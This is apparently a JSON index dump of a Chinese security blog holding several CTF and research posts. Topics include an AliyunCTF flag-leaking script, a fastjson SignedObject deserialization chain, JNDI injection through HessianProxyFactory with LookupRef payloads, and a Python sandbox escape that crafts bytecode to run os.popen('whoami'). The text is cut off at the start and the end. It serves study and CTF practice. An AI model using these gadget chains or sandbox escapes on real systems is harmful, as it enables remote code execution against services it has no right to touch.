[b\u0026#34;/bin/cat\u0026#34;], True, (), None, None, -1, -1, -1, stdout_write, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) os.close(stdout_write) res = os.read(stdout_read, 1024).decode() if res[{}] == \u0026#39;{}\u0026#39;: print(a + b) else: print(a + b - 1) \u0026#39;\u0026#39;\u0026#39;.strip() target = \u0026#39;aliyunctf{\u0026#39; while target[-1] != \u0026#39;}\u0026#39;: for i in cha: # time.sleep(0.5) if i == \u0026#39;\\n\u0026#39;: i = \u0026#39;\\\\n\u0026#39; payload = { \u0026#34;problem_id\u0026#34; : \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34; : code.format(str(len(target)), i) } print((target + i).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\\\n\u0026#39;), end=\u0026#39;\\r\u0026#39;) try: sp = requests.post(url=url + \u0026#39;/api/submit\u0026#39;, json=payload) except KeyboardInterrupt as e: print(target) exit() except: print(\u0026#39;network error\u0026#39;) print(target) exit() pass if json.loads(sp.text)[\u0026#39;status\u0026#39;] == \u0026#39;AC\u0026#39;: if i == \u0026#39;\\\\n\u0026#39;: target = target + \u0026#39;\\n\u0026#39; target = target + i break fork_exec不能直接使用通配符*，不过用sh -c 'cat /f*'应该可以。\n","permalink":"https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-vnctf_2025-aliyunctf_2025/","summary":"VNCTF 5道web解出了4道\njavaGuide /deser路由可以反序列化，有spring boot和fastjson 1.2.83的依赖。\n反序列化有黑名单：\nprotected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); String[] denyClasses = {\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax\u0026#34;, \u0026#34;javax.management\u0026#34;, \u0026#34;com.fasterxml.jackson\u0026#34;}; int length = denyClasses.length; for (String denyClass : denyClasses) { if (className.startsWith(denyClass)) { throw new InvalidClassException(\u0026#34;Unauthorized deserialization attempt\u0026#34;, className); } } return super.resolveClass(desc); } 可以用signedObject二次反序列化绕过\n利用链：\nEventListenerList.readobject() -\u0026gt;\rJSONArray.toString() -\u0026gt;\rSignedObject.getObject() -\u0026gt;\rEventListenerList.readobject() -\u0026gt;\rJSONArray.toString() -\u0026gt;\rTemplates.getOutputProperties() fastjson1.2.83使用引用绕过。\nTemplates templates = new TemplatesImpl(); setFieldValue(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{getEvilClass()}); setFieldValue(templates,\u0026#34;_class\u0026#34;,null); setFieldValue(templates,\u0026#34;_name\u0026#34;,\u0026#34;asd\u0026#34;); JSONArray jsonArray1 = new JSONArray(); jsonArray1.","title":"CTF记录-VNCTF_2025, AliyunCTF 2025"},{"content":"HessianProxy 浅蓝师傅在 探索高版本 JDK 下 JNDI 漏洞的利用方法 中提到过HessianProxyFactory这个工厂类。可以触发Hessian反序列化。\ngetObjectInstance代码如下：\npublic Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u0026lt;?,?\u0026gt; environment) throws Exception { Reference ref = (Reference) obj; String api = null; String url = null; for (int i = 0; i \u0026lt; ref.size(); i++) { RefAddr addr = ref.get(i); String type = addr.getType(); String value = (String) addr.getContent(); if (type.equals(\u0026#34;type\u0026#34;)) api = value; else if (type.equals(\u0026#34;url\u0026#34;)) url = value; ......... } ......... Class apiClass = Class.forName(api, false, _loader); return create(apiClass, url); } 从reference参数中获取api和url，调用create，代码如下：\npublic Object create(Class\u0026lt;?\u0026gt; api, URL url, ClassLoader loader) { if (api == null) throw new NullPointerException(\u0026#34;api must not be null for HessianProxyFactory.create()\u0026#34;); InvocationHandler handler = null; handler = new HessianProxy(url, this, api); return Proxy.newProxyInstance(loader, new Class[] { api, HessianRemoteObject.class }, handler ); } 传入的api为接口类名，创建了一个动态代理，handler会访问url获取数据。\n代理的invoke方法代码如下：\nconn = sendRequest(mangleName, args); is = getInputStream(conn); ...... AbstractHessianInput in; int code = is.read(); if (code == \u0026#39;H\u0026#39;) { int major = is.read(); int minor = is.read(); in = _factory.getHessian2Input(is); Object value = in.readReply(method.getReturnType()); ....... 访问url，前三个字节应该是控制版本不需要变。\nreadReply方法代码如下：\npublic Object readReply(Class expectedClass) throws Throwable { int tag = read(); if (tag == \u0026#39;R\u0026#39;) return readObject(expectedClass); else if (tag == \u0026#39;F\u0026#39;) { HashMap map = (HashMap) readObject(HashMap.class); throw prepareFault(map); } ......... } expectedClass是所代理方法的返回值类型。第四个字节为R则反序列化成expectedClass，若为F则反序列化成HashMap\nreadObject方法里会根据expectedClass获取Deserializer\nDeserializer reader = findSerializerFactory().getDeserializer(cl); 使用不同的Deserializer可以将反序列化的结果限制成不同的类型。\n主动触发invoke 写一个接口com.demo.LocalTest\npackage com.demo; public interface LocalTest { public void test(); } 发送以下Reference:\nReference ref = new Reference(\u0026#34;javax.lang.String\u0026#34;, \u0026#34;com.caucho.hessian.client.HessianProxyFactory\u0026#34;, null); ref.add(new StringRefAddr(\u0026#34;type\u0026#34;, \u0026#34;com.demo.LocalTest\u0026#34;)); ref.add(new StringRefAddr(\u0026#34;url\u0026#34;, \u0026#34;http://127.0.0.1:7000/exp\u0026#34;)); 7000端口HTTP server部署文件/exp\n// 将序列化数据添加前缀并写入/exp String data = \u0026#34;hessian ser data base64 encoded\u0026#34;; byte[] code = Base64.getDecoder().decode(data); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); try { byteArrayOutputStream.write(new byte[]{72, 2, 0, 82}); // 添加前缀使其进入readObject方法。 byteArrayOutputStream.write(code); jndi lookup后主动调用test方法：\nString url = \u0026#34;ldap://127.0.0.1:1389/test\u0026#34;; InitialContext initialContext = new InitialContext(); LocalTest test = (LocalTest) initialContext.lookup(url); test.test(); toString入口 如果序列化数据最外层是一个HashMap会调用Deserializer的readMap方法\ncom.demo.LocalTest#test的返回值为void\n根据void获得的Deserializer是BasicDeserializer，这个类的readMap方法实现如下：\npublic Object readMap(AbstractHessianInput in) throws IOException { Object obj = in.readObject(); String className = getClass().getName(); if (obj != null) throw error(className + \u0026#34;: unexpected object \u0026#34; + obj.getClass().getName() + \u0026#34; (\u0026#34; + obj + \u0026#34;)\u0026#34;); else throw error(className + \u0026#34;: unexpected null value\u0026#34;); } 在readMap里继续反序列化内部对象不再受到Deserializer限制，是正常的Hessian反序列化，但无论obj为什么类型，BasicDeserializer都不允许，会保存，但throw时可以触发toString\n正常Hessian反序列化 原本常规的那些需要hashCode、equals触发的Hessian反序列化链需要再套一层HashMap才行。\n其他可利用的Deserializer 既然BasicDeserializer可以触发toString，那可以找找其他有危险操作的Deserializer的实现类。\n大致找了找：\ntoString\nAbstractListDeserializer#readObject AbstractMapDeserializer#readObject BasicDeserializer#readMap JavaDeserializer UnsafeDeserializer equals\nAbstractStreamDeserializer#readMap AbstractStringValueDeserializer#readMap newInstance\nArrayDeserializer#createArray BeanDeserializer#instantiate CollectionDeserializer#createList JavaDeserializer SqlDateDeserializer StringValueDeserializer UnsafeDeserializer Method.invoke\nBeanDeserializer#readMap EnumDeserializer#create JavaDeserializer UnsafeDeserializer lookup\nRemoteDeserializer 自动触发invoke 上面提到想要触发反序列化需要代用代理的invoke，靠手动触发没什么意义。所以要在lookup过程中触发代理的invoke。\n浅蓝师傅在文章中使用的LookupRef\npayload:\nLookupRef ref = new LookupRef(\u0026#34;java.lang.String\u0026#34;,\u0026#34;look\u0026#34;); ref.add(new StringRefAddr(\u0026#34;factory\u0026#34;, \u0026#34;com.caucho.hessian.client.HessianProxyFactory\u0026#34;)); ref.add(new StringRefAddr(\u0026#34;type\u0026#34;, \u0026#34;java.lang.AutoCloseable\u0026#34;)); ref.add(new StringRefAddr(\u0026#34;url\u0026#34;, \u0026#34;http://127.0.0.1:7000/exp\u0026#34;)); LookupFactory的getObjectInstance方法的代码如下：\nif (factory != null) { result = factory.getObjectInstance(obj, name, nameCtx, environment); } else { if (lookupName == null) { throw new NamingException(sm.getString(\u0026#34;lookupFactory.createFailed\u0026#34;)); } else { result = new InitialContext().lookup(lookupName); } } Class\u0026lt;?\u0026gt; clazz = Class.forName(ref.getClassName()); if (result != null \u0026amp;\u0026amp; !clazz.isAssignableFrom(result.getClass())) { String msg = sm.getString(\u0026#34;lookupFactory.typeMismatch\u0026#34;, name, ref.getClassName(), lookupName, result.getClass().getName()); NamingException ne = new NamingException(msg); log.warn(msg, ne); // Close the resource we no longer need if we know how to do so if (result instanceof AutoCloseable) { try { ((AutoCloseable) result).close(); ........ 可以将LookupRef看做是Reference的Reference，能够调用代理的AutoCloseable#close方法。这个方法的返回值为void，所以能够触发toString\n堆栈：\ncom.demo.Test -\u0026gt; toString\rjava.lang.String -\u0026gt; valueOf\rjava.lang.StringBuilder -\u0026gt; append\rcom.caucho.hessian.io.AbstractDeserializer -\u0026gt; readMap\rcom.caucho.hessian.io.Hessian2Input -\u0026gt; readObject\rcom.caucho.hessian.io.Hessian2Input -\u0026gt; readReply\rcom.caucho.hessian.client.HessianProxy -\u0026gt; invoke\rjdk.proxy1.$Proxy0 -\u0026gt; close\rorg.apache.naming.factory.LookupFactory -\u0026gt; getObjectInstance\rjavax.naming.spi.DirectoryManager -\u0026gt; getObjectInstance\rcom.sun.jndi.ldap.LdapCtx -\u0026gt; c_lookup\rcom.sun.jndi.toolkit.ctx.ComponentContext -\u0026gt; p_lookup\rcom.sun.jndi.toolkit.ctx.PartialCompositeContext -\u0026gt; lookup\rcom.sun.jndi.toolkit.url.GenericURLContext -\u0026gt; lookup\rcom.sun.jndi.url.ldap.ldapURLContext -\u0026gt; lookup\rjavax.naming.InitialContext -\u0026gt; lookup 但除了LookupRef配合AutoCloseable，在jdk17的工厂类和jndi lookup流程中我没有找到其他的能够触发invoke的地方。\n总结 花了不少时间去找能利用的类，感觉这种利用方式意义不大。\n但至少能自动触发toString还是有收获的。\n参考 https://tttang.com/archive/1405/\n","permalink":"https://zoiltin.github.io/posts/jndi%E6%B3%A8%E5%85%A5hessianproxyfactory%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/","summary":"HessianProxy 浅蓝师傅在 探索高版本 JDK 下 JNDI 漏洞的利用方法 中提到过HessianProxyFactory这个工厂类。可以触发Hessian反序列化。\ngetObjectInstance代码如下：\npublic Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u0026lt;?,?\u0026gt; environment) throws Exception { Reference ref = (Reference) obj; String api = null; String url = null; for (int i = 0; i \u0026lt; ref.size(); i++) { RefAddr addr = ref.get(i); String type = addr.getType(); String value = (String) addr.getContent(); if (type.equals(\u0026#34;type\u0026#34;)) api = value; else if (type.equals(\u0026#34;url\u0026#34;)) url = value; ......... } .","title":"JNDI注入HessianProxyFactory的一点思考"},{"content":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n前言 javascript可以通过Function的构造方法从字符串创建函数。在eval被过滤的情况下可以通过字符串创建函数来绕过：\natob.constructor(\u0026#39;console.log(1);\u0026#39;)(); 最近在学习python沙箱逃逸，学习了python也能像js那样使用构造方法创建函数。本文用于记录一下学到的python中关于__new__有趣的玩法。才疏学浅，如有错误还请师傅们指正。\npython object 以下分析中python版本为3.12.6，不同版本略有差异\n下载源码：https://github.com/python/cpython/\n首先梳理一下python的对象。\npython中所有的对象都是由PyObject结构体扩展而来。type感觉类似于java里的Class，负责定义对象的一些基本信息。参考：https://flaggo.github.io/python3-source-code-analysis/objects/object/\ntype(obj)可以返回对象的type，type中的__new__方法用于创建对象。详细可参考MetaClass：https://liaoxuefeng.com/books/python/oop-adv/meta-class/\n__new__最终会调用到PyXXXObject_New api，创建一个对象\nPyFunctionObject PyFunctionObject的__new__定义在：cpython/Objects/funcobject.c，有如下注释：\n/*[clinic input]\r@classmethod\rfunction.__new__ as func_new\rcode: object(type=\u0026#34;PyCodeObject *\u0026#34;, subclass_of=\u0026#34;\u0026amp;PyCode_Type\u0026#34;)\ra code object\rglobals: object(subclass_of=\u0026#34;\u0026amp;PyDict_Type\u0026#34;)\rthe globals dictionary\rname: object = None\ra string that overrides the name from the code object\rargdefs as defaults: object = None\ra tuple that specifies the default argument values\rclosure: object = None\ra tuple that supplies the bindings for free variables\rCreate a function object.\r[clinic start generated code]*/ 由此可见PyFunctionObject接受PyCodeObject来存放可执行的python代码。\nPyFunctionObject对象的__code__属性存储PyCodeObject：\nstatic PyGetSetDef func_getsetlist[] = { {\u0026#34;__code__\u0026#34;, (getter)func_get_code, (setter)func_set_code}, {\u0026#34;__defaults__\u0026#34;, (getter)func_get_defaults, (setter)func_set_defaults}, {\u0026#34;__kwdefaults__\u0026#34;, (getter)func_get_kwdefaults, (setter)func_set_kwdefaults}, {\u0026#34;__annotations__\u0026#34;, (getter)func_get_annotations, (setter)func_set_annotations}, {\u0026#34;__dict__\u0026#34;, PyObject_GenericGetDict, PyObject_GenericSetDict}, {\u0026#34;__name__\u0026#34;, (getter)func_get_name, (setter)func_set_name}, {\u0026#34;__qualname__\u0026#34;, (getter)func_get_qualname, (setter)func_set_qualname}, {\u0026#34;__type_params__\u0026#34;, (getter)func_get_type_params, (setter)func_set_type_params}, {NULL} /* Sentinel */ }; getter方法func_get_code返回一个PyCodeObject\nPyCodeObject 不同版本python字节码语法和__new__的参数不同，不要混用，这里就不列出所有版本的写法了。\nversion \u0026gt;= 3.11 接受参数的文档在cpython/Objects/codeobject.c，__new__的注释如下：\n/*[clinic input]\r@classmethod\rcode.__new__ as code_new\rargcount: int\rposonlyargcount: int\rkwonlyargcount: int\rnlocals: int\rstacksize: int\rflags: int\rcodestring as code: object(subclass_of=\u0026#34;\u0026amp;PyBytes_Type\u0026#34;)\rconstants as consts: object(subclass_of=\u0026#34;\u0026amp;PyTuple_Type\u0026#34;)\rnames: object(subclass_of=\u0026#34;\u0026amp;PyTuple_Type\u0026#34;)\rvarnames: object(subclass_of=\u0026#34;\u0026amp;PyTuple_Type\u0026#34;)\rfilename: unicode\rname: unicode\rqualname: unicode\rfirstlineno: int\rlinetable: object(subclass_of=\u0026#34;\u0026amp;PyBytes_Type\u0026#34;)\rexceptiontable: object(subclass_of=\u0026#34;\u0026amp;PyBytes_Type\u0026#34;)\rfreevars: object(subclass_of=\u0026#34;\u0026amp;PyTuple_Type\u0026#34;, c_default=\u0026#34;NULL\u0026#34;) = ()\rcellvars: object(subclass_of=\u0026#34;\u0026amp;PyTuple_Type\u0026#34;, c_default=\u0026#34;NULL\u0026#34;) = ()\r/\rCreate a code object. Not for the faint of heart.\r[clinic start generated code]*/ 其中python代码用PyBytes_Type类型传递，函数名，变量名等均可控。自由度很高。\nversion \u0026lt;= 3.9 接受参数的文档在doc中。\nPyDoc_STRVAR(code_doc, \u0026#34;code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\\n\\ flags, codestring, constants, names, varnames, filename, name,\\n\\ firstlineno, lnotab[, freevars[, cellvars]])\\n\\ \\n\\ Create a code object. Not for the faint of heart.\u0026#34;); 参数类型：\n/* Check argument types */ if (argcount \u0026lt; posonlyargcount || posonlyargcount \u0026lt; 0 || kwonlyargcount \u0026lt; 0 || nlocals \u0026lt; 0 || stacksize \u0026lt; 0 || flags \u0026lt; 0 || code == NULL || !PyBytes_Check(code) || consts == NULL || !PyTuple_Check(consts) || names == NULL || !PyTuple_Check(names) || varnames == NULL || !PyTuple_Check(varnames) || freevars == NULL || !PyTuple_Check(freevars) || cellvars == NULL || !PyTuple_Check(cellvars) || name == NULL || !PyUnicode_Check(name) || filename == NULL || !PyUnicode_Check(filename) || lnotab == NULL || !PyBytes_Check(lnotab)) { PyErr_BadInternalCall(); return NULL; } 值得注意的是 \u0026lt;= 3.9 用到的globals names需要手动传递__globals__ dict，而在\u0026gt;= 3.10中似乎会自动将当前上下文中的内容传递进去。(下文会解释)\n构造函数 以下代码中的字节码为python 3.12.6生成的。\ndebug查看__code__相关属性的值。\ndef test_func(): print(\u0026#39;1\u0026#39;) __code__中的大部分属性都不需要改。\nfrom types import CodeType, FunctionType argcount = 0 posonlyargcount = 0 kwonlyargcount = 0 nlocals = 0 stacksize = 5 flags = 3 code = b\u0026#39;\\x97\\x00t\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x01\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00y\\x00\u0026#39; consts = (None, 1) names = (\u0026#39;print\u0026#39;, ) varnames = () filename = \u0026#39;\u0026#39; name = \u0026#39;\u0026#39; qualname = \u0026#39;\u0026#39; firstlineno = 1 linetable = b\u0026#39;\u0026#39; exceptiontable = b\u0026#39;\u0026#39; f = FunctionType(CodeType( argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags, code, consts, names, varnames, filename, name, qualname, firstlineno, linetable, exceptiontable ), {}) f() # print(1) FunctionType构造函数的大括号{}为函数运行时的__globals__ dict，在 \u0026gt;= 3.10版本似乎会自动将当前上下文中的内容传递进去，而在 \u0026lt;= 3.9版本，需要手动传例如 {\u0026quot;print\u0026quot;:print}\n简化一下：\nfrom types import CodeType, FunctionType code = b\u0026#39;\\x97\\x00t\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x01\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00y\\x00\u0026#39; f = FunctionType(CodeType(0, 0, 0, 0, 5, 3, code, (None, 1), (\u0026#39;print\u0026#39;, ), (), \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, 1, b\u0026#39;\u0026#39;, b\u0026#39;\u0026#39;), {}) f() # print(1) python字节码用bytes表示，相关变量名等(如print)也用字符串表示，这样就可以很容易通过编码绕过各种检测了，类似于eval的效果。\n不使用import获得相关type CodeType和FunctionType不属于关键字，也不在__builtins__里。除了通过从types模块import获取，还能通过type()获取，type()是__builtins__里的内建方法。\nFunctionType可以从任意函数获取：\nfunc_type = type(lambda: None) CodeType要麻烦些。查找源码中所有引用了PyCodeObject的地方： 找到以下可利用的方式：\nPyFrameObject.f_code // cpython/Objects/frameobject.c#L869 static PyGetSetDef frame_getsetlist[] = { {\u0026#34;f_back\u0026#34;, (getter)frame_getback, NULL, NULL}, {\u0026#34;f_locals\u0026#34;, (getter)frame_getlocals, NULL, NULL}, {\u0026#34;f_lineno\u0026#34;, (getter)frame_getlineno, (setter)frame_setlineno, NULL}, {\u0026#34;f_trace\u0026#34;, (getter)frame_gettrace, (setter)frame_settrace, NULL}, {\u0026#34;f_lasti\u0026#34;, (getter)frame_getlasti, NULL, NULL}, {\u0026#34;f_globals\u0026#34;, (getter)frame_getglobals, NULL, NULL}, {\u0026#34;f_builtins\u0026#34;, (getter)frame_getbuiltins, NULL, NULL}, {\u0026#34;f_code\u0026#34;, (getter)frame_getcode, NULL, NULL}, {\u0026#34;f_trace_opcodes\u0026#34;, (getter)frame_gettrace_opcodes, (setter)frame_settrace_opcodes, NULL}, {0} }; // cpython/Objects/frameobject.c#L1479 PyCodeObject * PyFrame_GetCode(PyFrameObject *frame) { assert(frame != NULL); assert(!_PyFrame_IsIncomplete(frame-\u0026gt;f_frame)); PyCodeObject *code = frame-\u0026gt;f_frame-\u0026gt;f_code; assert(code != NULL); return (PyCodeObject*)Py_NewRef(code); } 栈帧对象的f_code属性的getter方法可以读取一个PyCodeObject\n用法：\ndef gen(): yield 0 g = gen() print(type(g.gi_frame.f_code)) # \u0026lt;class \u0026#39;code\u0026#39;\u0026gt; PyFunctionObject.__code__ // cpython/Objects/funcobject.c#L695 static PyGetSetDef func_getsetlist[] = { {\u0026#34;__code__\u0026#34;, (getter)func_get_code, (setter)func_set_code}, {\u0026#34;__defaults__\u0026#34;, (getter)func_get_defaults, (setter)func_set_defaults}, {\u0026#34;__kwdefaults__\u0026#34;, (getter)func_get_kwdefaults, (setter)func_set_kwdefaults}, {\u0026#34;__annotations__\u0026#34;, (getter)func_get_annotations, (setter)func_set_annotations}, {\u0026#34;__dict__\u0026#34;, PyObject_GenericGetDict, PyObject_GenericSetDict}, {\u0026#34;__name__\u0026#34;, (getter)func_get_name, (setter)func_set_name}, {\u0026#34;__qualname__\u0026#34;, (getter)func_get_qualname, (setter)func_set_qualname}, {\u0026#34;__type_params__\u0026#34;, (getter)func_get_type_params, (setter)func_set_type_params}, {NULL} /* Sentinel */ }; // cpython/Objects/funcobject.c#L462 static PyObject * func_get_code(PyFunctionObject *op, void *Py_UNUSED(ignored)) { if (PySys_Audit(\u0026#34;object.__getattr__\u0026#34;, \u0026#34;Os\u0026#34;, op, \u0026#34;__code__\u0026#34;) \u0026lt; 0) { return NULL; } return Py_NewRef(op-\u0026gt;func_code); } function对象的__code__属性的getter方法return一个PyCodeObject\n用法：\ndef test(): pass print(type(test.__code__)) # \u0026lt;class \u0026#39;code\u0026#39;\u0026gt; PyGenObject.gi_code // cpython/Objects/genobject.c#L774 static PyObject * gen_getcode(PyGenObject *gen, void *Py_UNUSED(ignored)) { return _gen_getcode(gen, \u0026#34;gi_code\u0026#34;); } static PyGetSetDef gen_getsetlist[] = { {\u0026#34;__name__\u0026#34;, (getter)gen_get_name, (setter)gen_set_name, PyDoc_STR(\u0026#34;name of the generator\u0026#34;)}, {\u0026#34;__qualname__\u0026#34;, (getter)gen_get_qualname, (setter)gen_set_qualname, PyDoc_STR(\u0026#34;qualified name of the generator\u0026#34;)}, {\u0026#34;gi_yieldfrom\u0026#34;, (getter)gen_getyieldfrom, NULL, PyDoc_STR(\u0026#34;object being iterated by yield from, or None\u0026#34;)}, {\u0026#34;gi_running\u0026#34;, (getter)gen_getrunning, NULL, NULL}, {\u0026#34;gi_frame\u0026#34;, (getter)gen_getframe, NULL, NULL}, {\u0026#34;gi_suspended\u0026#34;, (getter)gen_getsuspended, NULL, NULL}, {\u0026#34;gi_code\u0026#34;, (getter)gen_getcode, NULL, NULL}, {NULL} /* Sentinel */ }; 生成器的gi_code属性获取code对象。\ndef gen(): yield 1 g = gen() print(type(g.gi_code)) # \u0026lt;class \u0026#39;code\u0026#39;\u0026gt; PyCoroObject.cr_code // cpython/Objects/genobject.c#L1120 static PyObject * cr_getcode(PyCoroObject *coro, void *Py_UNUSED(ignored)) { return _gen_getcode((PyGenObject *)coro, \u0026#34;cr_code\u0026#34;); } static PyGetSetDef coro_getsetlist[] = { {\u0026#34;__name__\u0026#34;, (getter)gen_get_name, (setter)gen_set_name, PyDoc_STR(\u0026#34;name of the coroutine\u0026#34;)}, {\u0026#34;__qualname__\u0026#34;, (getter)gen_get_qualname, (setter)gen_set_qualname, PyDoc_STR(\u0026#34;qualified name of the coroutine\u0026#34;)}, {\u0026#34;cr_await\u0026#34;, (getter)coro_get_cr_await, NULL, PyDoc_STR(\u0026#34;object being awaited on, or None\u0026#34;)}, {\u0026#34;cr_running\u0026#34;, (getter)cr_getrunning, NULL, NULL}, {\u0026#34;cr_frame\u0026#34;, (getter)cr_getframe, NULL, NULL}, {\u0026#34;cr_code\u0026#34;, (getter)cr_getcode, NULL, NULL}, {\u0026#34;cr_suspended\u0026#34;, (getter)cr_getsuspended, NULL, NULL}, {NULL} /* Sentinel */ }; 协程的cr_code属性\nasync def asy(): pass a = asy() print(type(a.cr_code)) # \u0026lt;class \u0026#39;code\u0026#39;\u0026gt; PyAsyncGenObject.ag_code // cpython/Objects/genobject.c#L1527 static PyObject * ag_getcode(PyGenObject *gen, void *Py_UNUSED(ignored)) { return _gen_getcode(gen, \u0026#34;ag_code\u0026#34;); } static PyGetSetDef async_gen_getsetlist[] = { {\u0026#34;__name__\u0026#34;, (getter)gen_get_name, (setter)gen_set_name, PyDoc_STR(\u0026#34;name of the async generator\u0026#34;)}, {\u0026#34;__qualname__\u0026#34;, (getter)gen_get_qualname, (setter)gen_set_qualname, PyDoc_STR(\u0026#34;qualified name of the async generator\u0026#34;)}, {\u0026#34;ag_await\u0026#34;, (getter)coro_get_cr_await, NULL, PyDoc_STR(\u0026#34;object being awaited on, or None\u0026#34;)}, {\u0026#34;ag_frame\u0026#34;, (getter)ag_getframe, NULL, NULL}, {\u0026#34;ag_code\u0026#34;, (getter)ag_getcode, NULL, NULL}, {\u0026#34;ag_suspended\u0026#34;, (getter)ag_getsuspended, NULL, NULL}, {NULL} /* Sentinel */ }; 异步生成器的ag_code属性\nasync def asy_gen(): yield 0 ag = asy_gen() print(type(ag.ag_code)) # \u0026lt;class \u0026#39;code\u0026#39;\u0026gt; 上面几种方法只是查找了类型为PyCodeObject的属性，如果算上mapping对象的dict以及其他module的话可能还有更多。不过单纯地静态分析代码应该不容易找到别的利用方式了(至少我找不到了)，可以试试动调看看，不过这就到了我的知识盲区了。\n这几种方法都会用到下划线，感觉容易被ban，不过我没有找到一条不包含下划线的调用链。\n关于字节码 前面的代码中出现的字节码中并不存在特定的变量名或关键字，python字节码一般只包含对堆栈的操作，所有的变量、常量都保存在names和consts中。\n以下面的代码为例：\n以下字节码由python 3.12.6生成\ndef test(): print(1) bytecode = test.__code__.co_code print(bytecode) # b\u0026#39;\\x97\\x00t\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x01\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00y\\x00\u0026#39; 用dis解析字节码如下：\n0 RESUME 0\r2 LOAD_GLOBAL 1\r12 LOAD_CONST 1\r14 CALL 1\r22 POP_TOP\r24 RETURN_CONST 0 流程：\nLOAD_GLOBAL 1，全局变量表中第一个元素的名字是print，然后根据'print'从函数上下文__globals__中找到\u0026lt;built-in function print\u0026gt;并入栈。(这里就对上了前面说的3.9和3.10的差异了) LOAD_CONST 1，将常量表中第一个元素入栈(push 1)。 CALL 1，从栈中调用函数并接受一个参数(print(1)) 所以说同样的字节码修改变量/常量表就可以影响执行结果：\ndef test(): return func1(0).func2(1).func3() code = test.__code__.co_code func_type = type(lambda: None) code_type = type((lambda: None).__code__) f = func_type(code_type(0, 0, 0, 0, 5, 3, code, (None, \u0026#39;os\u0026#39;, \u0026#39;whoami\u0026#39;), (\u0026#39;__import__\u0026#39;, \u0026#39;popen\u0026#39;, \u0026#39;read\u0026#39;), (), \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, 1, b\u0026#39;\u0026#39;, b\u0026#39;\u0026#39;), {}) print(f()) python的动态特性导致在创建函数时并不会严格检查代码内容，test函数调用func1(0).func2(2).func3()，修改consts和names后实际执行的是__import__('os').popen('whoami').read()。\n效果 以下代码运行在 python 3.12.6\nasync def test(): pass functype = type(test) codetype = type(test().cr_code) code = b\u0026#39;\\x97\\x00t\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x01\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00y\\x00\u0026#39; f = functype(codetype(0, 0, 0, 0, 5, 3, code, (None, 5), (\u0026#39;p\u0026#39;\u0026#39;r\u0026#39;\u0026#39;i\u0026#39;\u0026#39;n\u0026#39;\u0026#39;t\u0026#39;, ), (), \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;, 1, b\u0026#39;\u0026#39;, b\u0026#39;\u0026#39;), {}) f() # print(5) 可以用来绕waf之类的。\n除此之外，能够直接编写并执行字节码意味着能调用偏底层的api，还可以直接触发内存错误结束进程。 不过呢，沙箱环境一般不会给予type()，_也很有可能被过滤，audit的code.__new__也可以hook code类型的创建。似乎比较鸡肋的样子😅，但感觉应该还有更多有意思的玩法，奈何代码基本功比较差就到此为止了。\n参考 https://flaggo.github.io/python3-source-code-analysis/objects/object/\nhttps://jbnrz.com.cn/index.php/2024/08/15/pyjail/\nhttps://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#creating-the-code-object\nhttps://liaoxuefeng.com/books/python/oop-adv/meta-class/\n","permalink":"https://zoiltin.github.io/posts/python%E4%B8%AD%E5%85%B3%E4%BA%8E__new__%E7%9A%84%E4%B8%80%E4%B8%AAtrick/","summary":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n前言 javascript可以通过Function的构造方法从字符串创建函数。在eval被过滤的情况下可以通过字符串创建函数来绕过：\natob.constructor(\u0026#39;console.log(1);\u0026#39;)(); 最近在学习python沙箱逃逸，学习了python也能像js那样使用构造方法创建函数。本文用于记录一下学到的python中关于__new__有趣的玩法。才疏学浅，如有错误还请师傅们指正。\npython object 以下分析中python版本为3.12.6，不同版本略有差异\n下载源码：https://github.com/python/cpython/\n首先梳理一下python的对象。\npython中所有的对象都是由PyObject结构体扩展而来。type感觉类似于java里的Class，负责定义对象的一些基本信息。参考：https://flaggo.github.io/python3-source-code-analysis/objects/object/\ntype(obj)可以返回对象的type，type中的__new__方法用于创建对象。详细可参考MetaClass：https://liaoxuefeng.com/books/python/oop-adv/meta-class/\n__new__最终会调用到PyXXXObject_New api，创建一个对象\nPyFunctionObject PyFunctionObject的__new__定义在：cpython/Objects/funcobject.c，有如下注释：\n/*[clinic input]\r@classmethod\rfunction.__new__ as func_new\rcode: object(type=\u0026#34;PyCodeObject *\u0026#34;, subclass_of=\u0026#34;\u0026amp;PyCode_Type\u0026#34;)\ra code object\rglobals: object(subclass_of=\u0026#34;\u0026amp;PyDict_Type\u0026#34;)\rthe globals dictionary\rname: object = None\ra string that overrides the name from the code object\rargdefs as defaults: object = None\ra tuple that specifies the default argument values\rclosure: object = None\ra tuple that supplies the bindings for free variables\rCreate a function object.","title":"python中关于__new__的一个trick"},{"content":"SECCON CTF 13th Quals Trillion_Bank 题目代码：\nimport fastify from \u0026#34;fastify\u0026#34;; import crypto from \u0026#34;node:crypto\u0026#34;; import fs from \u0026#34;node:fs/promises\u0026#34;; import db from \u0026#34;./db.js\u0026#34;; const FLAG = 